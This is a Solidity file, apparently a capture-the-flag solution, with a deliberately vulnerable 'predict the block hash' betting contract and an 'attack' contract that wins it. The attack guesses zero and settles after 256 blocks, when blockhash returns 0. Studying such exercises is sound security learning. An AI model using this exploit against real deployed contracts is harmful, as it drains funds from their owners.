pragma solidity ^0.5.0;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 public settlementBlockNumber;

    function predictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = blockhash(settlementBlockNumber);/*blockhash 方法只能得到256个区块的hash 当超过256个后 blockhash方法只能返回0 */

        guesser = address(0);
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract attack{
   PredictTheBlockHashChallenge traget;
     uint256 num;
bytes32 public answer=bytes32(0);
constructor (address add) public
{
  traget = PredictTheBlockHashChallenge(add);
}
    function att1() public payable
    {
      num = block.number + 1;//得到blocknum
      traget.lockInGuess.value(1 ether)(answer);
    }
    function att2() public payable
    {
      require(block.number-256>num);
      traget.settle();
    }
    function() external payable{}
}
